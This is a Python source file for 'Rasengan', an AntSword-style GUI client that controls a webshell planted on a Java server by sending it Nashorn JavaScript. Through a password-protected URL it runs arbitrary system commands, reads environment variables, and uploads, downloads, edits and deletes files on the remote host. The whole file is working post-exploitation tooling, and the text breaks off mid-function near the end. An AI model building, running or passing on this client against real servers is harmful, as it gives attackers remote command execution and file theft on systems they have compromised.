#!/usr/bin/env python3
"""
Rasengan - Full file manager + terminal
Features: configurable URL/password, file browser, upload/download, delete, mkdir
"""
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, simpledialog
import base64
import ctypes
import requests
import threading
import os
import json
import time
from datetime import datetime

CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "nashorn_config.json")
IS_WINDOWS = os.name == "nt"
DEFAULT_DIR = "D:/" if IS_WINDOWS else "/"

# ─── Nashorn JS helpers ───
JS_LIST_FILES = """var f=new java.io.File("{}");var a=f.listFiles();if(!a){print('[]')}else{var r='[';for(var i=0;i<a.length;i++){var t=a[i];r+='{"n":"'+t.getName()+'","d":'+(t.isDirectory()?'true':'false')+',"s":'+t.length()+',"m":'+t.lastModified()+'}';if(i<a.length-1)r+=','}r+=']';print(r)}"""

JS_READ_FILE = """var f=new java.io.File("{}");var baos=new java.io.ByteArrayOutputStream();var fis=new java.io.FileInputStream(f);var buf=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,4096);var len;while((len=fis.read(buf))!=-1)baos.write(buf,0,len);fis.close();var b64=java.util.Base64.getEncoder().encodeToString(baos.toByteArray());print(b64)"""

JS_WRITE_FILE = """var f=new java.io.File("{}");var fos=new java.io.FileOutputStream(f);var data=java.util.Base64.getDecoder().decode("{}");fos.write(data);fos.close();print('OK')"""

JS_DELETE = """var f=new java.io.File("{}");print(f.delete())"""

JS_MKDIR = """var f=new java.io.File("{}");print(f.mkdirs())"""

JS_FILE_EXISTS = """var f=new java.io.File("{}");print(f.exists())"""

JS_LIST_ROOTS = """var a=java.io.File.listRoots();for(var i=0;i<a.length;i++){var p=a[i].getPath();var c=p.charAt(p.length()-1);if(c==String.fromCharCode(92)||c==String.fromCharCode(47)){p=p.substring(0,p.length()-1)}print(p+String.fromCharCode(47))}"""

# ─── Terminal shortcut helpers (like CLI) ───
TERM_HELPERS = {
    "ls": 'var f=new java.io.File("{}");var a=f.listFiles();if(a){for(var i=0;i<a.length;i++)print(a[i].getName())}else{print("Not found: {}")}',
    "cat": 'var s=new java.util.Scanner(new java.io.File("{}"));while(s.hasNextLine())print(s.nextLine());s.close()',
    "exec": 'var p=java.lang.Runtime.getRuntime().exec("{}");var buf=java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE,8192);var baos=new java.io.ByteArrayOutputStream();var n;while((n=p.getInputStream().read(buf))!=-1)baos.write(buf,0,n);var outBytes=baos.toByteArray();baos.reset();while((n=p.getErrorStream().read(buf))!=-1)baos.write(buf,0,n);var errBytes=baos.toByteArray();p.waitFor();function decode(b){if(b.length==0)return"";var s=new java.lang.String(b,"UTF-8");if(s.indexOf("�")>=0)s=new java.lang.String(b);return s}var r=decode(outBytes)+decode(errBytes);print(r)',
    "env": 'var v=java.lang.System.getenv("{}");print(v!=null?v:"<not set>")',
    "sysprop": 'var v=java.lang.System.getProperty("{}");print(v!=null?v:"<not set>")',
}

STATUS = {"ok": "#00cc44", "busy": "#cc8800", "err": "#cc0000"}

# ─── Helpers ───
def b64e(s):
    return base64.b64encode(s.encode()).decode()

def b64d(s):
    return base64.b64decode(s)

class ConfigDialog(tk.Toplevel):
    def __init__(self, parent, current=None):
        super().__init__(parent)
        self.title("Connection Settings")
        self.geometry("480x260")
        self.resizable(False, False)
        self.configure(bg="#2d2d2d")
        self.result = None
        self.transient(parent)
        self.grab_set()

        if current is None:
            current = {"url": "http://127.0.0.1:8080/vuldemo_war_exploded/mem4", "password": "guangnian", "mode": "form"}

        tk.Label(self, text="Connection Settings", bg="#2d2d2d", fg="white",
                font=("Segoe UI", 13, "bold")).pack(pady=(15, 10))

        f = tk.Frame(self, bg="#2d2d2d")
        f.pack(fill=tk.X, padx=20)

        tk.Label(f, text="URL:", bg="#2d2d2d", fg="#ccc", font=("Consolas", 10)).grid(row=0, column=0, sticky=tk.W, pady=5)
        self.url_entry = tk.Entry(f, bg="#1e1e1e", fg="#d4d4d4", insertbackground="#d4d4d4",
                                  font=("Consolas", 10), relief=tk.FLAT, width=45)
        self.url_entry.insert(0, current["url"])
        self.url_entry.grid(row=0, column=1, pady=5, padx=(10, 0))

        tk.Label(f, text="Password:", bg="#2d2d2d", fg="#ccc", font=("Consolas", 10)).grid(row=1, column=0, sticky=tk.W, pady=5)
        self.pwd_entry = tk.Entry(f, bg="#1e1e1e", fg="#d4d4d4", insertbackground="#d4d4d4",
                                  font=("Consolas", 10), relief=tk.FLAT, width=45)
        self.pwd_entry.insert(0, current["password"])
        self.pwd_entry.grid(row=1, column=1, pady=5, padx=(10, 0))

        tk.Label(f, text="Mode:", bg="#2d2d2d", fg="#ccc", font=("Consolas", 10)).grid(row=2, column=0, sticky=tk.W, pady=5)
        mode_frame = tk.Frame(f, bg="#2d2d2d")
        mode_frame.grid(row=2, column=1, pady=5, padx=(10, 0), sticky=tk.W)
        self.mode_var = tk.StringVar(value=current.get("mode", "form"))
        tk.Radiobutton(mode_frame, text="Form  ", variable=self.mode_var, value="form",
                       bg="#2d2d2d", fg="#ccc", selectcolor="#2d2d2d",
                       activebackground="#2d2d2d", activeforeground="white",
                       font=("Consolas", 10)).pack(side=tk.LEFT)
        tk.Radiobutton(mode_frame, text="Raw", variable=self.mode_var, value="raw",
                       bg="#2d2d2d", fg="#ccc", selectcolor="#2d2d2d",
                       activebackground="#2d2d2d", activeforeground="white",
                       font=("Consolas", 10)).pack(side=tk.LEFT, padx=(15, 0))

        btn_frame = tk.Frame(self, bg="#2d2d2d")
        btn_frame.pack(pady=15)
        tk.Button(btn_frame, text="Connect", command=self.ok, bg="#007acc", fg="white",
                 font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20, pady=3,
                 activebackground="#1a8ad4", borderwidth=0, cursor="hand2").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", command=self.cancel, bg="#555", fg="white",
                 font=("Segoe UI", 10), relief=tk.FLAT, padx=20, pady=3,
                 activebackground="#777", borderwidth=0, cursor="hand2").pack(side=tk.LEFT, padx=5)

        self.url_entry.focus_set()
        self.bind("<Return>", lambda e: self.ok())
        self.bind("<Escape>", lambda e: self.cancel())
        self.wait_window(self)

    def ok(self):
        self.result = {"url": self.url_entry.get().strip(), "password": self.pwd_entry.get().strip(),
                       "mode": self.mode_var.get()}
        self.destroy()

    def cancel(self):
        self.destroy()


class ProxyDialog(tk.Toplevel):
    def __init__(self, parent, current=None):
        super().__init__(parent)
        self.title("Proxy Settings")
        self.geometry("460x320")
        self.resizable(False, False)
        self.configure(bg="#2d2d2d")
        self.result = None
        self.transient(parent)
        self.grab_set()

        if current is None:
            current = {"enabled": False, "type": "http", "host": "", "port": "", "username": "", "password": ""}

        tk.Label(self, text="Proxy Settings", bg="#2d2d2d", fg="white",
                font=("Segoe UI", 13, "bold")).pack(pady=(15, 10))

        # Enable checkbox
        self.enabled_var = tk.BooleanVar(value=current.get("enabled", False))
        tk.Checkbutton(self, text="Enable Proxy", variable=self.enabled_var,
                       bg="#2d2d2d", fg="#ccc", selectcolor="#2d2d2d",
                       activebackground="#2d2d2d", activeforeground="white",
                       font=("Segoe UI", 10)).pack(pady=(0, 8))

        f = tk.Frame(self, bg="#2d2d2d")
        f.pack(fill=tk.X, padx=20)

        row_defs = [
            ("Type:", "type_combo"),
            ("Host:", "host_entry"),
            ("Port:", "port_entry"),
            ("Username:", "user_entry"),
            ("Password:", "pass_entry"),
        ]
        for i, (label, key) in enumerate(row_defs):
            tk.Label(f, text=label, bg="#2d2d2d", fg="#ccc", font=("Consolas", 10)).grid(
                row=i, column=0, sticky=tk.W, pady=4)
            if key == "type_combo":
                var = tk.StringVar(value=current.get("type", "http"))
                cb = ttk.Combobox(f, textvariable=var, state="readonly",
                                  values=["http", "https", "socks5"],
                                  font=("Consolas", 10), width=30)
                cb.grid(row=i, column=1, pady=4, padx=(10, 0))
                self.type_var = var
            elif key == "pass_entry":
                var = tk.StringVar(value=current.get("password", ""))
                entry = tk.Entry(f, textvariable=var, bg="#1e1e1e", fg="#d4d4d4",
                                show="*", insertbackground="#d4d4d4",
                                font=("Consolas", 10), relief=tk.FLAT, width=32)
                entry.grid(row=i, column=1, pady=4, padx=(10, 0))
                setattr(self, key, entry)
                setattr(self, key + "_var", var)
            else:
                field = key.replace("_entry", "")
                var = tk.StringVar(value=current.get(field, ""))
                entry = tk.Entry(f, textvariable=var, bg="#1e1e1e", fg="#d4d4d4",
                                insertbackground="#d4d4d4",
                                font=("Consolas", 10), relief=tk.FLAT, width=32)
                entry.grid(row=i, column=1, pady=4, padx=(10, 0))
                setattr(self, key, entry)
                setattr(self, key + "_var", var)

        btn_frame = tk.Frame(self, bg="#2d2d2d")
        btn_frame.pack(pady=15)
        tk.Button(btn_frame, text="Save", command=self.ok, bg="#007acc", fg="white",
                 font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20, pady=3,
                 activebackground="#1a8ad4", borderwidth=0, cursor="hand2").pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="Cancel", command=self.cancel, bg="#555", fg="white",
                 font=("Segoe UI", 10), relief=tk.FLAT, padx=20, pady=3,
                 activebackground="#777", borderwidth=0, cursor="hand2").pack(side=tk.LEFT, padx=5)

        self.bind("<Return>", lambda e: self.ok())
        self.bind("<Escape>", lambda e: self.cancel())
        self.wait_window(self)

    def ok(self):
        self.result = {
            "enabled": self.enabled_var.get(),
            "type": self.type_var.get(),
            "host": self.host_entry_var.get().strip(),
            "port": self.port_entry_var.get().strip(),
            "username": self.user_entry_var.get().strip(),
            "password": self.pass_entry_var.get().strip(),
        }
        self.destroy()

    def cancel(self):
        self.destroy()


class HostManagerTab(tk.Frame):
    """In-tab host management — AntSword-style left panel."""
    def __init__(self, parent, app):
        super().__init__(parent, bg="#1e1e1e")
        self.app = app
        self.setup_ui()

    def setup_ui(self):
        # Toolbar
        tb = tk.Frame(self, bg="#2d2d2d", height=32)
        tb.pack(fill=tk.X)
        tb.pack_propagate(False)

        btn_defs = [
            ("+ Add", self._add_host, "#007acc"),
            ("Edit", self._edit_host, "#2d2d2d"),
            ("Delete", self._delete_host, "#8b0000"),
        ]
        for text, cmd, bg in btn_defs:
            btn = tk.Button(tb, text=text, command=cmd, bg=bg, fg="white",
                          font=("Consolas", 9), relief=tk.FLAT, padx=10, cursor="hand2",
                          activebackground="#094771", borderwidth=0)
            btn.pack(side=tk.LEFT, padx=1, pady=3)
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#094771"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg=bg))

        self.status_lbl = tk.Label(tb, text="", bg="#2d2d2d", fg="#888", font=("Consolas", 9))
        self.status_lbl.pack(side=tk.RIGHT, padx=10)

        # Treeview
        tree_frame = tk.Frame(self, bg="#1e1e1e")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        columns = ("name", "url", "mode")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings",
                                  selectmode="browse", style="HostTree.Treeview")
        self.tree.heading("name", text="Name")
        self.tree.heading("url", text="URL")
        self.tree.heading("mode", text="Mode")
        self.tree.column("name", width=140)
        self.tree.column("url", width=360)
        self.tree.column("mode", width=55, anchor=tk.CENTER)

        vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)

        style = ttk.Style()
        style.configure("HostTree.Treeview", background="#0d0d0d", foreground="#d4d4d4",
                       fieldbackground="#0d0d0d", rowheight=26, font=("Consolas", 10))
        style.configure("HostTree.Treeview.Heading", background="#2d2d2d", foreground="#ccc",
                       font=("Consolas", 9, "bold"), relief=tk.FLAT)
        style.map("HostTree.Treeview", background=[("selected", "#094771")])

        self.tree.bind("<Double-1>", self._on_double_click)
        self.tree.bind("<Button-3>", self._on_right_click)

    def refresh(self):
        self.tree.delete(*self.tree.get_children())
        count = 0
        for name, h in self.app.hosts.items():
            is_active = " ★" if name == self.app.active_name else ""
            self.tree.insert("", tk.END, iid=name, values=(
                name + is_active, h["url"], h.get("mode", "form")))
            count += 1
        self.status_lbl.config(text=f"{count} hosts")

    def _get_selected(self):
        sel = self.tree.selection()
        if not sel:
            return None
        return sel[0]

    def _on_double_click(self, event):
        name = self._get_selected()
        if name:
            self.app._activate_host(name)
            self.app.notebook.select(self.app.term_tab)

    def _on_right_click(self, event):
        name = self._get_selected()
        if not name:
            return
        menu = tk.Menu(self, tearoff=0, bg="#2d2d2d", fg="#ccc", activebackground="#094771")
        menu.add_command(label="Connect (open Terminal)", command=lambda: self._on_double_click(None))
        menu.add_separator()
        menu.add_command(label="Edit", command=self._edit_host)
        menu.add_command(label="Delete", command=self._delete_host)
        menu.post(event.x_root, event.y_root)

    def _add_host(self):
        dlg = ConfigDialog(self, {"url": "http://", "password": "", "mode": "form"})
        if dlg.result:
            name = self._derive_name(dlg.result["url"])
            base_name = name
            i = 2
            while name in self.app.hosts:
                name = f"{base_name} ({i})"
                i += 1
            self.app.hosts[name] = {"url": dlg.result["url"], "password": dlg.result["password"],
                                    "mode": dlg.result.get("mode", "form")}
            self.app.active_name = name
            self.app.save_config()
            self.refresh()
            # Auto-connect and switch to terminal
            self.app._activate_host(name)
            self.app.notebook.select(self.app.term_tab)

    def _edit_host(self):
        name = self._get_selected()
        if not name:
            messagebox.showwarning("No Selection", "Select a host first.", parent=self)
            return
        h = self.app.hosts[name]
        dlg = ConfigDialog(self, {"url": h["url"], "password": h["password"],
                                   "mode": h.get("mode", "form")})
        if dlg.result:
            was_active = (name == self.app.active_name)
            new_name = self._derive_name(dlg.result["url"])
            if new_name != name:
                del self.app.hosts[name]
                base_name = new_name
                i = 2
                while new_name in self.app.hosts:
                    new_name = f"{base_name} ({i})"
                    i += 1
                name = new_name
            self.app.hosts[name] = {"url": dlg.result["url"], "password": dlg.result["password"],
                                    "mode": dlg.result.get("mode", "form")}
            if was_active:
                self.app.active_name = name
                self.app._activate_host(name)
            self.app.save_config()
            self.refresh()

    def _delete_host(self):
        name = self._get_selected()
        if not name:
            messagebox.showwarning("No Selection", "Select a host first.", parent=self)
            return
        if messagebox.askyesno("Confirm Delete", f"Delete host '{name}'?", parent=self):
            was_active = (name == self.app.active_name)
            del self.app.hosts[name]
            if was_active:
                self.app.active_name = list(self.app.hosts.keys())[0] if self.app.hosts else None
                if self.app.active_name:
                    self.app._activate_host(self.app.active_name)
                else:
                    self.app.shell = None
            self.app.save_config()
            self.refresh()

    def _derive_name(self, url):
        try:
            from urllib.parse import urlparse
            p = urlparse(url)
            return p.hostname or "Host"
        except:
            return "Host"


class FileManagerTab(tk.Frame):
    def __init__(self, parent, shell):
        super().__init__(parent, bg="#1e1e1e")
        self.shell = shell
        self.current_dir = DEFAULT_DIR
        self.files = []
        self.selected = None
        self.setup_ui()

    def setup_ui(self):
        # Address bar
        addr = tk.Frame(self, bg="#252526", height=32)
        addr.pack(fill=tk.X)
        addr.pack_propagate(False)

        tk.Button(addr, text="⬆ Up", command=self.go_up, bg="#2d2d2d", fg="#ccc",
                 font=("Consolas", 9), relief=tk.FLAT, padx=8, cursor="hand2",
                 activebackground="#094771", borderwidth=0).pack(side=tk.LEFT, padx=4, pady=3)

        # Drive selector dropdown
        self.drive_var = tk.StringVar()
        self.drive_cb = ttk.Combobox(addr, textvariable=self.drive_var, state="readonly",
                                      font=("Consolas", 10), width=6)
        self.drive_cb.pack(side=tk.LEFT, padx=(0, 4), pady=3)
        self.drive_cb.bind("<<ComboboxSelected>>", lambda e: self.navigate(self.drive_var.get()))

        self.dir_var = tk.StringVar(value=self.current_dir)
        self.dir_entry = tk.Entry(addr, textvariable=self.dir_var, bg="#1e1e1e", fg="#d4d4d4",
                                  font=("Consolas", 10), relief=tk.FLAT, insertbackground="#d4d4d4")
        self.dir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, pady=3)
        self.dir_entry.bind("<Return>", lambda e: self.navigate(self.dir_var.get()))

        tk.Button(addr, text="Go", command=lambda: self.navigate(self.dir_var.get()),
                 bg="#007acc", fg="white", font=("Consolas", 9), relief=tk.FLAT, padx=10,
                 cursor="hand2", activebackground="#1a8ad4", borderwidth=0).pack(side=tk.LEFT, padx=4, pady=3)

        # Toolbar
        tb = tk.Frame(self, bg="#2d2d2d", height=30)
        tb.pack(fill=tk.X)
        tb.pack_propagate(False)

        buttons = [
            ("Upload", self.upload_file),
            ("Download", self.download_file),
            ("Delete", self.delete_file),
            ("New Dir", self.new_dir),
            ("New File", self.new_file),
            ("Rename", self.rename_file),
            ("", None),
            ("Refresh", self.refresh),
        ]
        for text, cmd in buttons:
            if not text:
                tk.Frame(tb, width=1, bg="#444").pack(side=tk.LEFT, fill=tk.Y, padx=3, pady=3)
                continue
            btn = tk.Button(tb, text=text, command=cmd, bg="#2d2d2d", fg="#ccc",
                          font=("Consolas", 9), relief=tk.FLAT, padx=8, cursor="hand2",
                          activebackground="#094771", borderwidth=0)
            btn.pack(side=tk.LEFT, padx=1, pady=3)
            btn.bind("<Enter>", lambda e, b=btn: b.configure(bg="#094771"))
            btn.bind("<Leave>", lambda e, b=btn: b.configure(bg="#2d2d2d"))

        # Status
        self.status_lbl = tk.Label(tb, text="", bg="#2d2d2d", fg="#888", font=("Consolas", 9))
        self.status_lbl.pack(side=tk.RIGHT, padx=10)

        # File list (Treeview)
        tree_frame = tk.Frame(self, bg="#1e1e1e")
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)

        columns = ("name", "size", "modified")
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings",
                                 selectmode="browse", style="FileTree.Treeview")
        self.tree.heading("name", text="Name", command=lambda: self.sort_by("name"))
        self.tree.heading("size", text="Size", command=lambda: self.sort_by("size"))
        self.tree.heading("modified", text="Modified", command=lambda: self.sort_by("modified"))
        self.tree.column("name", width=350, minwidth=200)
        self.tree.column("size", width=100, minwidth=80, anchor=tk.E)
        self.tree.column("modified", width=160, minwidth=120)

        vsb = ttk.Scrollbar(tree_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=vsb.set)
        self.tree.grid(row=0, column=0, sticky="nsew")
        vsb.grid(row=0, column=1, sticky="ns")
        tree_frame.grid_rowconfigure(0, weight=1)
        tree_frame.grid_columnconfigure(0, weight=1)

        self.tree.bind("<Double-1>", self.on_double_click)
        self.tree.bind("<ButtonRelease-1>", self.on_select)

        # Style
        style = ttk.Style()
        style.theme_use("default")
        style.configure("FileTree.Treeview", background="#0d0d0d", foreground="#d4d4d4",
                       fieldbackground="#0d0d0d", rowheight=24, font=("Consolas", 10))
        style.configure("FileTree.Treeview.Heading", background="#2d2d2d", foreground="#ccc",
                       font=("Consolas", 9, "bold"), relief=tk.FLAT)
        style.map("FileTree.Treeview", background=[("selected", "#094771")])

        self.sort_col = "name"
        self.sort_rev = False

    def navigate(self, path):
        path = path.strip().replace("\\", "/")
        if not path.endswith("/"):
            path += "/"
        self.current_dir = path
        self.dir_var.set(path)
        self.refresh()

    def go_up(self):
        parent = os.path.dirname(self.current_dir.rstrip("/")).replace("\\", "/")
        if not parent.endswith("/"):
            parent += "/"
        if parent != self.current_dir:
            self.navigate(parent)

    def refresh(self):
        self.tree.delete(*self.tree.get_children())
        self.files = []
        self.status_lbl.config(text="Loading...")
        threading.Thread(target=self._do_list, daemon=True).start()

    def populate_drives(self):
        """Query server for available drives and populate the dropdown. Called once on connect."""
        threading.Thread(target=self._populate_drives, daemon=True).start()

    def _populate_drives(self):
        result = self.shell.exec(JS_LIST_ROOTS)
        roots = [r.strip() for r in result.splitlines() if r.strip() and (len(r.strip()) <= 4 and r.strip().endswith('/'))]
        if roots:
            def _update():
                self.drive_cb["values"] = roots
                matched = False
                for r in roots:
                    if self.current_dir.startswith(r):
                        self.drive_var.set(r)
                        matched = True
                        break
                if not matched and roots:
                    self.drive_var.set(roots[0])
            self.tree.after(0, _update)

    def _do_list(self):
        code = JS_LIST_FILES.replace('{}', self.current_dir)
        result = self.shell.exec(code)
        try:
            data = json.loads(result)
            self.files = data
            def _update():
                self.tree.delete(*self.tree.get_children())
                if len(data) == 0:
                    self.tree.insert("", tk.END, values=("  (Empty folder)", "", ""))
                # Directories first, then files
                dirs = [f for f in data if f.get("d")]
                files = [f for f in data if not f.get("d")]
                sorted_items = sorted(dirs, key=lambda x: x.get("n", "").lower()) + \
                              sorted(files, key=lambda x: x.get("n", "").lower())
                for f in sorted_items:
                    name = f["n"]
                    is_dir = f.get("d", False)
                    size = "" if is_dir else self._fmt_size(f.get("s", 0))
                    mt = datetime.fromtimestamp(f.get("m", 0) / 1000).strftime("%Y-%m-%d %H:%M")
                    icon = "📁" if is_dir else "📄"
                    display = f"  {icon}  {name}" if is_dir else f"     {name}"
                    self.tree.insert("", tk.END, values=(display, size, mt), tags=("dir" if is_dir else "file"))
                self.tree.tag_configure("dir", foreground="#569cd6")
                self.tree.tag_configure("file", foreground="#d4d4d4")
                count = len(data)
                self.status_lbl.config(text=f"{count} items")
            self.tree.after(0, _update)
        except:
            self.tree.after(0, lambda: self.status_lbl.config(text="Parse error"))

    def _fmt_size(self, size):
        for unit in ["B", "KB", "MB", "GB"]:
            if size < 1024:
                return f"{size:.0f} {unit}"
            size /= 1024
        return f"{size:.0f} TB"

    def sort_by(self, col):
        if self.sort_col == col:
            self.sort_rev = not self.sort_rev
        else:
            self.sort_col = col
            self.sort_rev = False
        self.refresh()

    def on_select(self, event):
        sel = self.tree.selection()
        if sel:
            values = self.tree.item(sel[0])["values"]
            name = values[0].strip().lstrip("📁📄").strip()
            self.selected = name

    def on_double_click(self, event):
        if not self.selected:
            return
        path = self.current_dir + self.selected
        # Check if directory
        for f in self.files:
            if f["n"] == self.selected and f.get("d"):
                self.navigate(path + "/")
                return
        # Double-click file → open in editor
        self._edit_file(path)

    def _edit_file(self, remote_path):
        """Fetch and open a file in edit mode."""
        self.status_lbl.config(text=f"Loading {os.path.basename(remote_path)}...")
        threading.Thread(target=self._do_edit, args=(remote_path,), daemon=True).start()

    def _do_edit(self, remote_path):
        code = JS_READ_FILE.replace('{}', remote_path)
        result = self.shell.exec(code)
        try:
            content = base64.b64decode(result.strip()).decode('utf-8', errors='replace')
            self.tree.after(0, lambda: FileViewer(
                self, os.path.basename(remote_path), content,
                remote_path=remote_path, shell=self.shell, edit_mode=True))
        except Exception as e:
            self.tree.after(0, lambda: self.status_lbl.config(text=f"Edit error: {e}"))

    def get_selected_path(self):
        if not self.selected:
            messagebox.showwarning("No Selection", "Select a file or folder first.")
            return None
        return self.current_dir.rstrip("/") + "/" + self.selected

    def upload_file(self):
        local = filedialog.askopenfilename(title="Select file to upload")
        if not local:
            return
        fname = os.path.basename(local)
        remote = self.current_dir.rstrip("/") + "/" + fname
        with open(local, "rb") as f:
            data_b64 = base64.b64encode(f.read()).decode()
        # Use smaller chunks for large files
        self.status_lbl.config(text=f"Uploading {fname}...")
        threading.Thread(target=self._do_write, args=(remote, data_b64, fname), daemon=True).start()

    def _do_write(self, path, data_b64, name):
        code = JS_WRITE_FILE.replace('{}', path, 1).replace('{}', data_b64)
        result = self.shell.exec(code)
        def _done():
            if "OK" in result:
                self.status_lbl.config(text=f"Uploaded: {name}")
                self.refresh()
            else:
                self.status_lbl.config(text=f"Upload failed: {result}")
        self.tree.after(0, _done)

    def download_file(self):
        path = self.get_selected_path()
        if not path:
            return
        # Check if it's a file
        for f in self.files:
            if f["n"] == self.selected and not f.get("d"):
                local = filedialog.asksaveasfilename(title="Save file as", initialfile=self.selected)
                if not local:
                    return
                self.status_lbl.config(text=f"Downloading {self.selected}...")
                threading.Thread(target=self._do_download, args=(path, local), daemon=True).start()
                return
        messagebox.showwarning("Not a file", "Select a file to download (not a folder).")

    def _do_download(self, remote, local):
        code = JS_READ_FILE.replace('{}', remote)
        result = self.shell.exec(code)
        try:
            data = base64.b64decode(result.strip())
            with open(local, "wb") as f:
                f.write(data)
            self.tree.after(0, lambda: self.status_lbl.config(text=f"Downloaded: {os.path.basename(local)} ({len(data)} bytes)"))
        except Exception as e:
            self.tree.after(0, lambda: self.status_lbl.config(text=f"Download error: {e}"))

    def delete_file(self):
        path = self.get_selected_path()
        if not path:
            return
        if not messagebox.askyesno("Confirm Delete", f"Delete:\n{path}\n\nThis cannot be undone.", parent=self):
            return
        self.status_lbl.config(text="Deleting...")
        threading.Thread(target=self._do_delete, args=(path,), daemon=True).start()

    def _do_delete(self, path):
        result = self.shell.exec(JS_DELETE.replace('{}', path))
        self.tree.after(0, lambda r=result: self.status_lbl.config(text=f"Deleted" if "true" in r.lower() else f"Delete failed: {r}"))
        self.tree.after(0, self.refresh)

    def new_dir(self):
        name = simpledialog.askstring("New Directory", "Directory name:", parent=self)
        if not name:
            return
        path = self.current_dir.rstrip("/") + "/" + name
        self.status_lbl.config(text="Creating directory...")
        threading.Thread(target=self._do_mkdir, args=(path, name), daemon=True).start()

    def _do_mkdir(self, path, name):
        result = self.shell.exec(JS_MKDIR.replace('{}', path))
        self.tree.after(0, lambda: self.status_lbl.config(text=f"Created: {name}" if "true" in result.lower() else f"Failed: {result}"))
        self.tree.after(0, self.refresh)

    def new_file(self):
        name = simpledialog.askstring("New File", "File name:", parent=self)
        if not name:
            return
        path = self.current_dir.rstrip("/") + "/" + name
        # Create empty file (base64 of empty string)
        code = JS_WRITE_FILE.replace('{}', path, 1).replace('{}', '')
        self.status_lbl.config(text="Creating file...")
        threading.Thread(target=lambda: self._do_create_file(code, name), daemon=True).start()

    def _do_create_file(self, code, name):
        result = self.shell.exec(code)
        self.tree.after(0, lambda: self.status_lbl.config(text=f"Created: {name}" if "OK" in result else f"Failed: {result}"))
        self.tree.after(0, self.refresh)

    def rename_file(self):
        old = self.get_selected_path()
        if not old:
            return
        new_name = simpledialog.askstring("Rename", f"New name for '{self.selected}':", parent=self)
        if not new_name:
            return
        new = self.current_dir.rstrip("/") + "/" + new_name
        code = f"""var f=new java.io.File("{old}");print(f.renameTo(new java.io.File("{new}")))"""
        self.status_lbl.config(text="Renaming...")
        threading.Thread(target=lambda: self._do_rename(code, new_name), daemon=True).start()

    def _do_rename(self, code, new_name):
        result = self.shell.exec(code)
        self.tree.after(0, lambda: self.status_lbl.config(text=f"Renamed to: {new_name}" if "true" in result.lower() else f"Rename failed: {result}"))
        self.tree.after(0, self.refresh)



class FileViewer(tk.Toplevel):
    """Text file viewer / editor dialog"""
    def __init__(self, parent, filename, content, remote_path=None, shell=None, edit_mode=False):
        super().__init__(parent)
        self.edit_mode = edit_mode
        self.remote_path = remote_path
        self.shell = shell
        self.file_tab = parent  # FileManagerTab instance for status updates

        mode_label = "Edit" if edit_mode else "View"
        self.title(f"{mode_label}: {filename}")
        self.geometry("900x600")
        self.minsize(600, 400)
        self.configure(bg="#1e1e1e")
        self.transient(parent)

        # Header
        hdr = tk.Frame(self, bg="#2d2d2d", height=28)
        hdr.pack(fill=tk.X)
        hdr.pack_propagate(False)
        self.header_label = tk.Label(hdr, text=f"  {filename}  ({len(content)} bytes, {content.count(chr(10))+1} lines)",
                bg="#2d2d2d", fg="#ccc", font=("Consolas", 10))
        self.header_label.pack(side=tk.LEFT, padx=8)

        # Save button (edit mode only)
        if edit_mode:
            btn_frame = tk.Frame(hdr, bg="#2d2d2d")
            btn_frame.pack(side=tk.RIGHT, padx=6)
            tk.Button(btn_frame, text="💾 Save  Ctrl+S", command=self._save,
                     bg="#007acc", fg="white", font=("Consolas", 10, "bold"),
                     relief=tk.FLAT, padx=12, pady=1, cursor="hand2",
                     activebackground="#1a8ad4", borderwidth=0).pack(side=tk.RIGHT)
            self.bind("<Control-s>", lambda e: self._save())
            self.bind("<Control-S>", lambda e: self._save())

        # Line numbers + text area
        body = tk.Frame(self, bg="#1e1e1e")
        body.pack(fill=tk.BOTH, expand=True)

        self.lineno = tk.Text(body, bg="#252526", fg="#858585", font=("Consolas", 11),
                              width=6, relief=tk.FLAT, borderwidth=0, state=tk.DISABLED)
        self.lineno.pack(side=tk.LEFT, fill=tk.Y)

        self.text = scrolledtext.ScrolledText(body, bg="#0d0d0d", fg="#d4d4d4",
                                              insertbackground="#d4d4d4",
                                              font=("Consolas", 11), relief=tk.FLAT,
                                              borderwidth=0, wrap=tk.NONE)
        self.text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Scroll sync
        self.text.vbar = self.text.vbar
        def _on_scroll(*args):
            self.text.yview(*args)
            self._sync_lineno()
        self.text.vbar.configure(command=_on_scroll)

        # Populate
        self.text.insert("1.0", content)
        self._sync_lineno()
        if not edit_mode:
            self.text.configure(state=tk.DISABLED)

        self.text.bind("<MouseWheel>", lambda e: self.after(1, self._sync_lineno))
        self.text.bind("<Button-4>", lambda e: self.after(1, self._sync_lineno))
        self.text.bind("<Button-5>", lambda e: self.after(1, self._sync_lineno))
        self.bind("<Escape>", lambda e: self.destroy())

    def _save(self):
        """Save edited content back to remote server."""
        if not self.edit_mode or not self.remote_path or not self.shell:
            return
        content = self.text.get("1.0", tk.END)
        # Normalize line endings for consistency
        if content.endswith('\n'):
            content = content[:-1]
        data_b64 = base64.b64encode(content.encode('utf-8')).decode()
        self.header_label.config(text="  Saving...", fg="#cc8800")
        threading.Thread(target=self._do_save, args=(data_b64,), daemon=True).start()

    def _do_save(self, data_b64):
        code = JS_WRITE_FILE.replace('{}', self.remote_path, 1).replace('{}', data_b64)
        result = self.shell.exec(code)
        def _done():
            if "OK" in result:
                self.header_label.config(text=f"  Saved: {os.path.basename(self.remote_path)}", fg="#00cc44")
                if self.file_tab:
